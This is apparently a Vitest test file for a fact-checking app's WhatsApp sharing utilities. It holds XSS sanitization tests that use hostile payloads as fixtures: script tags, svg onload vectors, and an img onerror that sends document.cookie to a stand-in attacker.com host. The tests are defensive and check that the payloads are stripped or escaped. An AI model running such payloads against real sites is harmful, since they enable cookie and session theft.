import { describe, it, expect } from 'vitest'
import {
  generateWhatsAppShareText,
  buildWhatsAppShareUrl,
  escapeHtml,
  sanitizeHtml
} from '../utils/share'
import type { VerificationResult } from '../types'

describe('WhatsApp Sharing & Formatted Text Generator', () => {
  it('generates formatted text with bold asterisks and permalink for standard fact-check', () => {
    const mockResult: Partial<VerificationResult> = {
      verdict: 'HOAX',
      confidence: 95,
      article_title: 'Vaksin Flu Menyebabkan Kemandulan Permanen',
      summary: 'Klaim ini bertentangan dengan bukti ilmiah dari WHO dan Kemenkes RI.',
      share_hash: 'a1b2c3d4e5f6',
      is_threat: false
    }

    const text = generateWhatsAppShareText(mockResult, {
      permalinkBase: 'https://jevbeez.hityo.cloud'
    })

    // Check bold markdown formatting
    expect(text).toContain('*Status:* HOAX')
    expect(text).toContain('*Tingkat Keyakinan:* 95%')
    expect(text).toContain('*Klaim / Judul:* "Vaksin Flu Menyebabkan Kemandulan Permanen"')
    expect(text).toContain('*Ringkasan Fakta:*')
    expect(text).toContain('Klaim ini bertentangan dengan bukti ilmiah dari WHO dan Kemenkes RI.')

    // Check permalink inclusion
    expect(text).toContain('https://jevbeez.hityo.cloud/check?id=a1b2c3d4e5f6')
  })

  it('generates formatted text for cyber threat warnings with brand and action advice', () => {
    const mockThreat: Partial<VerificationResult> = {
      verdict: 'PHISHING',
      confidence: 96,
      article_title: 'BCA Login Promo Gebyar Undian',
      article_url: 'https://bca.co.id.login-promo.xyz/auth',
      summary: 'Situs ini meniru tampilan perbankan BCA untuk mencuri kredensial login.',
      target_brand: 'bca',
      is_threat: true,
      share_hash: 'threat123hash'
    }

    const text = generateWhatsAppShareText(mockThreat)

    expect(text).toContain('🚨 *PERINGATAN ANCAMAN SIBER (JevBeez Security)*')
    expect(text).toContain('*Status:* PHISHING')
    expect(text).toContain('*Target Brand:* BCA')
    expect(text).toContain('⚠️ *PENTING:* Jangan klik atau isi data pribadi/perbankan apapun di link tersebut!')
    expect(text).toContain('https://jevbeez.hityo.cloud/check?id=threat123hash')
  })

  it('generates formatted text for text broadcast verification mode', () => {
    const mockTextMode: Partial<VerificationResult> = {
      verdict: 'UNVERIFIED',
      confidence: 50,
      article_title: 'Klaim pesan berantai air es',
      summary: 'Tidak ditemukan bukti rujukan atau klarifikasi di media kredibel.',
      is_text_mode: true,
      share_hash: 'text9988hash'
    }

    const text = generateWhatsAppShareText(mockTextMode)

    expect(text).toContain('🔍 *HASIL VERIFIKASI PESAN TERUSAN (JevBeez AI)*')
    expect(text).toContain('*Status:* UNVERIFIED')
    expect(text).toContain('https://jevbeez.hityo.cloud/check?id=text9988hash')
  })

  it('builds properly encoded WhatsApp share URL', () => {
    const sampleMessage = '🔍 *HASIL CEK FAKTA JEVBEEZ*\n\n*Status:* HOAX\n*Tautan:* https://jevbeez.hityo.cloud'
    const shareUrl = buildWhatsAppShareUrl(sampleMessage)

    expect(shareUrl.startsWith('https://api.whatsapp.com/send?text=')).toBe(true)
    const encodedPart = shareUrl.replace('https://api.whatsapp.com/send?text=', '')
    expect(decodeURIComponent(encodedPart)).toBe(sampleMessage)
  })

  it('validates permalink hash format safety (alphanumeric 8-64 characters)', () => {
    const isValidHash = (h: string) => /^[a-zA-Z0-9]{8,64}$/.test(h)

    expect(isValidHash('a1b2c3d4')).toBe(true)
    expect(isValidHash('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')).toBe(true)
    expect(isValidHash('short')).toBe(false) // too short (<8)
    expect(isValidHash('../traversal')).toBe(false)
    expect(isValidHash('<script>')).toBe(false)
    expect(isValidHash('hash with space')).toBe(false)
    expect(isValidHash('a'.repeat(65))).toBe(false) // too long (>64)
  })
})

describe('XSS Safety & HTML Sanitization in Share Output', () => {
  it('strips script tags completely from claims and summaries', () => {
    const maliciousClaim = '<script>alert(document.cookie)</script>Pemerintah bagi bansos'
    const sanitized = sanitizeHtml(maliciousClaim)

    expect(sanitized).toBe('alert(document.cookie)Pemerintah bagi bansos')
    expect(sanitized).not.toContain('<script>')
    expect(sanitized).not.toContain('</script>')
  })

  it('strips image onerror payloads', () => {
    const maliciousImg = '<img src="invalid.jpg" onerror="fetch(\'http://attacker.com?leak=\'+document.cookie)">Bansos resmi'
    const sanitized = sanitizeHtml(maliciousImg)

    expect(sanitized).not.toContain('<img')
    expect(sanitized).not.toContain('onerror')
    expect(sanitized).toBe('Bansos resmi')
  })

  it('strips svg onload vectors', () => {
    const maliciousSvg = '<svg/onload=alert(1)>Klaim palsu'
    const sanitized = sanitizeHtml(maliciousSvg)

    expect(sanitized).not.toContain('<svg')
    expect(sanitized).not.toContain('onload')
    expect(sanitized).toBe('Klaim palsu')
  })

  it('escapes special characters to prevent DOM-based XSS when rendering', () => {
    const raw = `<script>alert("XSS & Injection's test")</script>`
    const escaped = escapeHtml(raw)

    expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS &amp; Injection&#39;s test&quot;)&lt;/script&gt;')
    expect(escaped).not.toContain('<script>')
  })

  it('ensures generateWhatsAppShareText neutralizes hostile XSS payloads', () => {
    const hostileResult: Partial<VerificationResult> = {
      verdict: 'HOAX',
      confidence: 90,
      article_title: '<script>alert(1)</script>Klaim Menyesatkan',
      summary: '<img src=x onerror=alert(2)>Bantahan resmi atas hoaks',
      target_brand: '<svg onload=alert(3)>bca',
      share_hash: 'safehash123',
      is_threat: true
    }

    const shareOutput = generateWhatsAppShareText(hostileResult)

    // No raw unescaped HTML tags should survive in the output text
    expect(shareOutput).not.toContain('<script>')
    expect(shareOutput).not.toContain('</script>')
    expect(shareOutput).not.toContain('<img')
    expect(shareOutput).not.toContain('<svg')
    expect(shareOutput).toContain('Klaim Menyesatkan')
    expect(shareOutput).toContain('Bantahan resmi atas hoaks')
  })
})
